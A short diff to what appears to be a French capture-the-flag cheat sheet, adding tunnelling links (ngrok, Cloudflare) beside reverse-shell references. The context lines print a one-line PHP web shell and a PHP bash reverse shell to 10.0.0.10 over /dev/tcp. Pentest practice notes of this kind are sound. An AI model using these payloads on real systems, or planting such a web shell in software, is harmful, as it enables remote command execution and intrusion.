@@ -12,7 +12,9 @@
 ## CTF
 	
 - https://www.revshells.com/
-- Par internet --> https://dashboard.ngrok.com/get-started/setup
+- Par internet :
+	- https://dashboard.ngrok.com/get-started/setup
+    - https://blog.cloudflare.com/protected-quick-tunnels/
 - Reverse shell PHP --> [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
 	- `<?php system($_GET["cmd"]) ?>`
    	- `<?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'");`
